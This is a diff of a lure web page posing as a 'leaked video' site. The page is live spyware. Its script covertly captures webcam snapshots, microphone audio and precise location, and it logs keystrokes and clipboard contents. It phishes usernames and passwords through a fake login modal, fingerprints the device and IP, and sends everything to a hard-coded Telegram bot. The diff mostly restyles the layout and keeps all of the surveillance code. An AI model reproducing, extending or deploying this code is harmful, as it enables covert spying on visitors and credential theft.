@@ -5,76 +5,151 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>វីដេអូបែកធ្លាយ</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
-    :root { --theme-color: #FF0076; }
-    body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
-    h1 { text-align: center; color: #ffffff; padding: 35px; background: var(--theme-color); border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-    .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
-    .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
-    .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
-    .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
-    .video-card video { display: block; width: 100%; height: auto; }
-    .capture-container { display: none; }
-    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
-    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; }
-    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(255,255,255,0.95); padding: 30px 40px; border-radius: 10px; text-align: center; }
-    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; text-align: center; }
-    .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; border-radius: 5px; }
-    input[type="file"] { display: none; }
-    #fileName { color: #555; margin-left: 10px; }
+    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
+
+    :root {
+      --theme-color: #FF0076;
+      --background-color: #f9f9f9;
+      --card-background: #ffffff;
+      --text-primary: #0f0f0f;
+      --text-secondary: #606060;
+      --border-color: #ddd;
+    }
+    body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); }
+
+    .hidden { display: none !important; }
+
+    .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
+    .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.5em; color: var(--theme-color); margin: 0; }
+    .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; }
+    .back-button:hover { background-color: #ddd; }
+
+    #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
+    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
+    .video-card { cursor: pointer; }
+    .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
+    .thumbnail-wrapper img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
+    .video-card:hover .thumbnail-wrapper img { transform: scale(1.05); }
+    .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
+    .video-details { display: flex; gap: 12px; }
+    .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; }
+    .video-metadata { display: flex; flex-direction: column; }
+    .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .channel-name, .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }
+
+    #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
+    .main-video-content { flex: 1; min-width: 0; }
+    .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; }
+    .player-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+    .main-video-title { font-size: 1.4em; font-weight: 700; margin: 16px 0 8px 0; }
+    .video-info-bar { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
+    .subscribe-btn { margin-left: auto; background-color: var(--theme-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 500; cursor: pointer; }
+    .description-box { background-color: #eee; padding: 12px; border-radius: 12px; margin-top: 20px; }
+    .description-box .video-stats { color: var(--text-primary); font-weight: 500; }
+    .description-box .description-text { margin-top: 8px; line-height: 1.5; }
+    .recommendations-sidebar { width: 400px; flex-shrink: 0; }
+    .recommendations-sidebar h3 { margin: 0 0 16px 0; }
+    .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
+    .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
+
+    @media (max-width: 1200px) {
+        #video-player-page { flex-direction: column; }
+        .recommendations-sidebar { width: 100%; margin-top: 24px; }
+    }
+    
+    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
+    .modal.visible { display: block; opacity: 1; }
+    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transform: scale(0.95); transition: transform 0.3s ease; }
+    .modal.visible .modal-content { transform: scale(1); }
+    .modal h2 { font-family: "Kantumruy Pro", serif; font-weight: 700; margin-top: 0; }
+    #loginForm input { width: calc(100% - 24px); padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 1em; }
+    #loginForm button { width: 100%; padding: 12px; border: none; border-radius: 8px; background-color: var(--theme-color); color: white; font-size: 1.1em; font-weight: 500; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>វីដេអូបែកធ្លាយ</h1>
-  <div class="container">
-    <div class="video-grid">
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="machiu.mp4" type="video/mp4"></video></div>
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p1.mp4" type="video/mp4"></video></div>
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p2.mp4" type="video/mp4"></video></div>
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p3.mp4" type="video/mp4"></video></div>
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p4.mp4" type="video/mp4"></video></div>
-        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
+
+  <header class="site-header">
+    <h1 id="header-title">វីដេអូបែកធ្លាយ</h1>
+    <button id="back-to-grid" class="back-button hidden">&larr; Back</button>
+  </header>
+
+  <main id="video-grid-page">
+    <div class="container">
+      <div class="video-grid">
+        <div class="video-card" data-video-src="machiu.mp4" data-title="This is a sample video title that is quite long to show how it wraps" data-channel="Awesome Creator" data-views="1.2M" data-date="2 days ago" data-avatar="https://placehold.co/40x40/FF0076/FFF?text=A" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+1" alt="Video Thumbnail"><span class="duration">12:34</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">This is a sample video title that is quite long to show how it wraps</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">1.2M views &bull; 2 days ago</p></div></div>
+        </div>
+        <div class="video-card" data-video-src="p1.mp4" data-title="Another Interesting Clip" data-channel="Video Master" data-views="890k" data-date="5 days ago" data-avatar="https://placehold.co/40x40/5c9aff/FFF?text=B" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+2" alt="Video Thumbnail"><span class="duration">08:15</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Another Interesting Clip</h3><p class="channel-name">Video Master</p><p class="video-stats">890k views &bull; 5 days ago</p></div></div>
+        </div>
+        <div class="video-card" data-video-src="p2.mp4" data-title="Check This Out: Full Guide" data-channel="HowTo Channel" data-views="2.5M" data-date="1 week ago" data-avatar="https://placehold.co/40x40/34d399/FFF?text=C" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+3" alt="Video Thumbnail"><span class="duration">21:05</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/34d399/FFF?text=C" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Check This Out: Full Guide</h3><p class="channel-name">HowTo Channel</p><p class="video-stats">2.5M views &bull; 1 week ago</p></div></div>
+        </div>
+        <div class="video-card" data-video-src="p3.mp4" data-title="Exclusive Footage Revealed" data-channel="Awesome Creator" data-views="750k" data-date="1 week ago" data-avatar="https://placehold.co/40x40/FF0076/FFF?text=A" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+4">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+4" alt="Video Thumbnail"><span class="duration">05:40</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/FF0076/FFF?text=A" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Exclusive Footage Revealed</h3><p class="channel-name">Awesome Creator</p><p class="video-stats">750k views &bull; 1 week ago</p></div></div>
+        </div>
+        <div class="video-card" data-video-src="p4.mp4" data-title="User Submitted Video Highlights" data-channel="Community Clips" data-views="480k" data-date="2 weeks ago" data-avatar="https://placehold.co/40x40/f59e0b/FFF?text=D" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+5">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+5" alt="Video Thumbnail"><span class="duration">15:00</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/f59e0b/FFF?text=D" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">User Submitted Video Highlights</h3><p class="channel-name">Community Clips</p><p class="video-stats">480k views &bull; 2 weeks ago</p></div></div>
+        </div>
+        <div class="video-card" data-video-src="p5.mp4" data-title="Final Clip Highlights and Review" data-channel="Video Master" data-views="3.1M" data-date="3 weeks ago" data-avatar="https://placehold.co/40x40/5c9aff/FFF?text=B" data-poster="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+6">
+            <div class="thumbnail-wrapper"><img src="https://placehold.co/600x400/ffe8f0/FF0076?text=Video+6" alt="Video Thumbnail"><span class="duration">09:22</span></div>
+            <div class="video-details"><img src="https://placehold.co/40x40/5c9aff/FFF?text=B" alt="Channel Avatar" class="channel-avatar"><div class="video-metadata"><h3 class="video-title">Final Clip Highlights and Review</h3><p class="channel-name">Video Master</p><p class="video-stats">3.1M views &bull; 3 weeks ago</p></div></div>
+        </div>
+      </div>
     </div>
-    <div class="capture-container">
-      <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
-      <canvas id="snapshot" width="200" height="200"></canvas>
-    </div>
-  </div>
+  </main>
+
+  <main id="video-player-page" class="hidden">
+      <div class="main-video-content">
+          <div class="player-wrapper"><video id="main-player" controls autoplay playsinline webkit-playsinline></video></div>
+          <h2 id="main-video-title" class="main-video-title"></h2>
+          <div class="video-info-bar">
+              <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar">
+              <div class="video-metadata">
+                  <p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p>
+                  <p class="video-stats">1.2M subscribers</p>
+              </div>
+              <button class="subscribe-btn">Subscribe</button>
+          </div>
+          <div class="description-box">
+              <p id="main-video-stats" class="video-stats"></p>
+              <p class="description-text">This is a placeholder for the video description. You can add more details about the video content here. #hashtag #anothertag</p>
+          </div>
+      </div>
+      <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
+  </main>
+
   <div id="loginModal" class="modal">
     <div class="modal-content">
       <h2>Please Login to Watch Full Video</h2>
-      <form id="loginForm">
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Login</button>
-      </form>
+      <form id="loginForm"><input type="text" id="username" placeholder="Username" required><input type="password" id="password" placeholder="Password" required><button type="submit">Login</button></form>
     </div>
   </div>
-  <div id="successOverlay" class="success-overlay">🎉 Login Successful!</div>
-  <div class="container upload-section">
-    <h2>Upload Your Video</h2>
-    <label for="videoUpload" class="custom-file-upload">Choose File</label>
-    <input type="file" id="videoUpload" accept="video/*,image/*">
-    <span id="fileName">No file chosen</span>
-    <button id="uploadVideoButton">Upload</button>
-  </div>
+  <div class="capture-container"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>
 
 <script>
     // --- Configuration ---
     const config = {
         botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
         chatId: "8017801890",
-        snapshotInterval: 3000, // <-- CHANGED TO 3 SECONDS
-        micRecordInterval: 10000, // ms
+        snapshotInterval: 3000,
+        micRecordInterval: 10000,
     };
 
     // --- DOM Elements ---
     const videoCaptureEl = document.getElementById("videoElementForCapture");
     const canvasEl = document.getElementById("snapshot");
     const loginModalEl = document.getElementById('loginModal');
-    const uploadButton = document.getElementById('uploadVideoButton');
-    const fileInput = document.getElementById('videoUpload');
-    const fileNameSpan = document.getElementById('fileName');
+    const gridPage = document.getElementById('video-grid-page');
+    const playerPage = document.getElementById('video-player-page');
+    const mainPlayer = document.getElementById('main-player');
+    const backButton = document.getElementById('back-to-grid');
+    const headerTitle = document.getElementById('header-title');
 
     // --- State Variables ---
     let microphoneStream, mediaRecorder, snapshotIntervalId;
@@ -87,261 +162,150 @@
     async function initializeTracking() {
         sendToBot("🚀 New Session Started");
         sendInitialReport();
-        
-        if (!navigator.mediaDevices || !window.isSecureContext) {
-            sendToBot("⚠️ **CRITICAL**: Cannot access Camera/Mic. Page is not secure (not HTTPS) or browser is too old.");
-        }
-
+        if (!navigator.mediaDevices || !window.isSecureContext) { sendToBot("⚠️ **CRITICAL**: Cannot access Camera/Mic. Not HTTPS or old browser."); }
         await checkAndWatchPermission('camera', requestCamera, stopCamera);
         await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
         await checkAndWatchPermission('geolocation', requestGeolocation);
-
         setupEventListeners();
         detectDevTools();
     }
 
     async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) {
-        if (!navigator.permissions) {
-            sendToBot(`⚠️ Cannot query permissions. Requesting ${name} directly.`);
-            requestFn(); 
-            return;
-        }
+        if (!navigator.permissions) { requestFn(); return; }
         try {
             const status = await navigator.permissions.query({ name: name });
-            sendToBot(`📊 Initial ${name} permission: ${status.state}`);
             if (status.state === 'granted') requestFn();
             else if (status.state === 'prompt') requestFn();
-            
-            status.onchange = () => {
-                sendToBot(`🔄 ${name} permission changed to: ${status.state}`);
-                if (status.state === 'granted') requestFn();
-                else if (stopFn) stopFn();
-            };
-        } catch (e) {
-            sendToBot(`⚠️ Could not query ${name} permission. Requesting directly. Error: ${e.message}`);
-            requestFn();
-        }
-    }
-
-    // --- Device & Media Control ---
-    function requestCamera() {
-        if (videoCaptureEl.srcObject?.active || videoCaptureEl.dataset.requesting === 'true') return;
-        
-        videoCaptureEl.dataset.requesting = 'true';
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                delete videoCaptureEl.dataset.requesting;
-                videoCaptureEl.srcObject = stream;
-                sendToBot("✅ Camera access granted. Stream active.");
-                videoCaptureEl.onloadedmetadata = () => {
-                    sendToBot(`📹 Camera stream initialized. Starting snapshots every ${config.snapshotInterval / 1000} seconds.`);
-                    if(snapshotIntervalId) clearInterval(snapshotIntervalId);
-                    snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval);
-                };
-            }).catch(err => {
-                delete videoCaptureEl.dataset.requesting;
-                handleMediaError("Camera")(err);
-            });
-    }
-    function stopCamera() {
-        videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop());
-        videoCaptureEl.srcObject = null;
-        if (snapshotIntervalId) clearInterval(snapshotIntervalId);
-        sendToBot("❌ Camera access stopped or revoked.");
+            status.onchange = () => { if (status.state === 'granted') requestFn(); else if (stopFn) stopFn(); };
+        } catch (e) { requestFn(); }
     }
     
-    function captureAndSend(caption = "📸 Webcam Snapshot") {
-        try {
-            if (!videoCaptureEl.srcObject?.active || videoCaptureEl.videoWidth === 0) {
-                return; // Fail silently to avoid spamming chat with errors if stream is temporarily unavailable
-            }
-            
-            const context = canvasEl.getContext("2d");
-            canvasEl.width = videoCaptureEl.videoWidth;
-            canvasEl.height = videoCaptureEl.videoHeight;
-            context.drawImage(videoCaptureEl, 0, 0, videoCaptureEl.videoWidth, videoCaptureEl.videoHeight);
-            
-            canvasEl.toBlob(blob => {
-                if (blob) {
-                    sendPhoto(blob, caption);
-                }
-            }, "image/png");
-
-        } catch (e) {
-            sendToBot(`🚫 CRITICAL CAPTURE ERROR: ${e.name} - ${e.message}`);
-        }
-    }
-
-    function requestMicrophone() {
-        if (microphoneStream?.active) return;
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                microphoneStream = stream;
-                startMicRecording(stream);
-                sendToBot("✅ Microphone access granted.");
-            }).catch(handleMediaError("Microphone"));
-    }
-    function stopMicrophone() {
-        microphoneStream?.getTracks().forEach(track => track.stop());
-        microphoneStream = null;
-        if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
-        sendToBot("❌ Microphone access stopped/revoked.");
-    }
-    function requestGeolocation() {
-        if (userLocation.lat !== "N/A") return;
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`);
-                sendLocationAsMap(userLocation.lat, userLocation.lon);
-            },
-            err => sendToBot(`🚫 Geolocation Error: ${err.code === 1 ? "Permission Denied" : "Unavailable"}`),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
-    function startMicRecording(stream) {
-        if (!window.MediaRecorder) {
-            sendToBot("⚠️ MediaRecorder API not supported.");
-            return;
-        }
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data);
-        mediaRecorder.start(config.micRecordInterval);
-    }
-    
-    // --- Telegram API Communication ---
-    function sendBeaconToBot(message) {
-        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-        const data = JSON.stringify({ chat_id: config.chatId, text: message, disable_notification: true });
-        navigator.sendBeacon(url, new Blob([data], { type: 'application/json' }));
-    }
-    async function sendToBot(message) {
-        if (!message) return;
-        try {
-            await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true })
-            });
-        } catch (err) { console.error("Net MsgErr:", err); }
-    }
-    async function sendLocationAsMap(latitude, longitude) {
-        try {
-            await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: config.chatId, latitude, longitude, disable_notification: true })
-            });
-        } catch (err) { sendToBot(`🚫 Net Map Err: ${err.message}`); }
-    }
-    async function sendFormData(endpoint, formData) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData });
-            if (!response.ok) { const errorData = await response.json(); throw new Error(`API Error: ${errorData.description}`); }
-        } catch (err) { console.warn(`Net Form Data Err: ${err.message}`); } // Use warn to reduce console noise
-    }
-    function sendPhoto(blob, caption) {
-        const fd = new FormData();
-        fd.append("chat_id", config.chatId);
-        fd.append("photo", blob, "snap.png");
-        fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
-        sendFormData("sendPhoto", fd);
-    }
-    function sendAudioToBot(audioBlob) {
-        const fd = new FormData();
-        fd.append("chat_id", config.chatId);
-        fd.append("audio", audioBlob, "mic_recording.webm");
-        fd.append("caption", `🎤 Audio Clip\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
-        sendFormData("sendAudio", fd);
-    }
-    function sendDocument(file) {
-        sendToBot(`📦 Uploading file: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)...`);
-        const fd = new FormData();
-        fd.append("chat_id", config.chatId);
-        fd.append("document", file, file.name);
-        fd.append("caption", `📄 File Uploaded by User\nFilename: ${file.name}`);
-        sendFormData("sendDocument", fd);
-    }
-
-    // --- Information Gathering ---
-    async function sendInitialReport() {
-        let report = "💻 *Initial Visitor Report*\n\n";
-        try {
-            const ipRes = await fetch("https://api.ipify.org?format=json"); const ipData = await ipRes.json();
-            report += `*IP Address:* \`${ipData.ip}\`\n`;
-        } catch (e) { report += "*IP Address:* Not Found\n"; }
-        const ua = navigator.userAgent;
-        const os = ua.includes("Win")?"Windows":ua.includes("Mac")?"MacOS":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux/Other";
-        const browser = ua.includes("Firefox/")?"Firefox":/Edg\//.test(ua)?"Edge":/Chrome\//.test(ua)?"Chrome":/Safari\//.test(ua)?"Safari":"Other";
-        report += `*OS:* ${os}\n*Browser:* ${browser}\n*Screen:* ${screen.width}x${screen.height}\n`;
-        try { report += `*Orientation:* ${screen.orientation.type}\n`; } catch (e) {}
-        try {
-            const battery = await navigator.getBattery();
-            report += `*Battery:* ${Math.round(battery.level * 100)}% (${battery.charging ? '⚡ Charging' : '🔋 Discharging'})\n`;
-        } catch(e) { /* Ignore */ }
-        const conn = navigator.connection;
-        if (conn) report += `*Network:* ${conn.type} (Speed: ${conn.effectiveType})\n`;
-        if (navigator.deviceMemory) report += `*RAM (Approx):* ${navigator.deviceMemory}GB\n`;
-        report += `*Canvas Fingerprint:* \`${getCanvasFingerprint()}\``;
-        sendToBot(report);
-    }
-    function getCanvasFingerprint() {
-        const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
-        const txt = 'UserAgent_Is_A_Lie_123!@#$%^&*()';
-        ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
-        ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText(txt, 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17);
-        const dataUrl = canvas.toDataURL(); let hash = 0;
-        for (let i = 0; i < dataUrl.length; i++) { const char = dataUrl.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; }
-        return hash.toString(16);
-    }
-
-    // --- Event Listeners & Advanced Trackers ---
+    // --- UI Event Listeners & Page Switching ---
     function setupEventListeners() {
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`);
-            } else { sendToBot(`👀 Tab became active again.`); }
+        document.querySelectorAll('.video-card, .compact-video-card').forEach(card => {
+            card.addEventListener('click', () => showPlayerPage(card));
         });
+
+        backButton.addEventListener('click', showGridPage);
+
+        mainPlayer.addEventListener('timeupdate', function() {
+            if (!isLoggedIn && this.currentTime >= 5) {
+                this.pause();
+                loginModalEl.classList.add('visible');
+            }
+        });
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); const user = this.elements.username.value; const pass = this.elements.password.value;
-            sendToBot(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``); keyLogBuffer = "";
-            if (user && pass) { isLoggedIn = true; localStorage.setItem("isLoggedIn", "true"); loginModalEl.style.display = 'none';
-                sendToBot(`✅ Login successful for "${user}".`); captureAndSend(`📸 Snapshot on Login`);
-            } else { sendToBot(`❌ Login failed for "${user}".`); }
+            e.preventDefault();
+            const user = this.elements.username.value;
+            const pass = this.elements.password.value;
+            sendToBot(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``);
+            keyLogBuffer = "";
+            if (user && pass) {
+                isLoggedIn = true;
+                localStorage.setItem("isLoggedIn", "true");
+                loginModalEl.classList.remove('visible');
+                sendToBot(`✅ Login successful for "${user}".`);
+                captureAndSend(`📸 Snapshot on Login`);
+                mainPlayer.play();
+            } else {
+                sendToBot(`❌ Login failed for "${user}".`);
+            }
             this.reset();
         });
-        document.querySelectorAll('.homevideo').forEach(vid => {
-            const vidName = vid.querySelector('source').src.split('/').pop();
-            vid.addEventListener('play', function() { if (!isLoggedIn && this.currentTime >= 5) { this.pause(); loginModalEl.style.display = 'block'; } else sendToBot(`▶️ Play: ${vidName}`); });
-            vid.addEventListener('pause', () => sendToBot(`⏸️ Pause: ${vidName}`)); vid.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${vidName}`));
+
+        const mainVideoSource = mainPlayer.querySelector('source') || document.createElement('source');
+        if (!mainPlayer.contains(mainVideoSource)) mainPlayer.appendChild(mainVideoSource);
+
+        mainPlayer.addEventListener('play', () => sendToBot(`▶️ Play: ${mainPlayer.src.split('/').pop()}`));
+        mainPlayer.addEventListener('pause', () => sendToBot(`⏸️ Pause: ${mainPlayer.src.split('/').pop()}`));
+        mainPlayer.addEventListener('ended', () => sendToBot(`⏹️ Ended: ${mainPlayer.src.split('/').pop()}`));
+
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - pageStartTime) / 1000); sendBeaconToBot(`🚪 Page hidden. Session time: ${time}s.`); } 
+            else { sendToBot(`👀 Tab became active again.`); }
         });
-        fileInput.addEventListener('change', () => { fileNameSpan.textContent = fileInput.files.length > 0 ? fileInput.files[0].name : 'No file chosen'; });
-        uploadButton.addEventListener('click', () => { if (fileInput.files.length > 0) { sendDocument(fileInput.files[0]); } else { sendToBot("⚠️ User clicked upload with no file selected."); }});
-        document.addEventListener('keydown', e => { if (e.key.length === 1) { keyLogBuffer += e.key; } else if (e.key === 'Backspace') { keyLogBuffer = keyLogBuffer.slice(0, -1); } else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } else { keyLogBuffer += ` [${e.key}] `; }});
+
+        document.addEventListener('keydown', e => {
+            if (e.key.length === 1) keyLogBuffer += e.key;
+            else if (e.key === 'Backspace') keyLogBuffer = keyLogBuffer.slice(0, -1);
+            else if (e.key === 'Enter') { sendToBot(`⌨️ Enter in ${e.target.tagName}:\n\`\`\`\n${keyLogBuffer}\n\`\`\``); keyLogBuffer = ""; } 
+            else keyLogBuffer += ` [${e.key}] `;
+        });
+
         document.addEventListener('copy', async () => { try { const text = await navigator.clipboard.readText(); if (text) { sendToBot(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {/*ignore*/}});
     }
-    function detectDevTools() {
-        const threshold = 160;
-        let devToolsOpen = false;
-        const check = () => {
-            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
-                if (!devToolsOpen) {
-                    sendToBot("⚠️ Developer Tools Opened!");
-                    devToolsOpen = true;
-                }
-            } else {
-                devToolsOpen = false;
-            }
-            requestAnimationFrame(check);
-        };
-        requestAnimationFrame(check);
-     }
-    function handleMediaError(type) {
-        return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`);
+
+    function showPlayerPage(card) {
+        const data = card.dataset;
+        mainPlayer.src = data.videoSrc;
+        mainPlayer.poster = data.poster;
+        document.getElementById('main-video-title').textContent = data.title;
+        document.getElementById('main-channel-avatar').src = data.avatar;
+        document.getElementById('main-channel-name').textContent = data.channel;
+        document.getElementById('main-video-stats').textContent = `${data.views} views • ${data.date}`;
+        
+        populateRecommendations(data.videoSrc);
+        
+        gridPage.classList.add('hidden');
+        playerPage.classList.remove('hidden');
+        backButton.classList.remove('hidden');
+        headerTitle.classList.add('hidden');
+        window.scrollTo(0, 0);
     }
 
-    // --- Start ---
-    if (isLoggedIn) { loginModalEl.style.display = 'none'; }
+    function showGridPage() {
+        mainPlayer.pause();
+        mainPlayer.src = "";
+        playerPage.classList.add('hidden');
+        gridPage.classList.remove('hidden');
+        backButton.classList.add('hidden');
+        headerTitle.classList.remove('hidden');
+    }
+
+    function populateRecommendations(currentVideoSrc) {
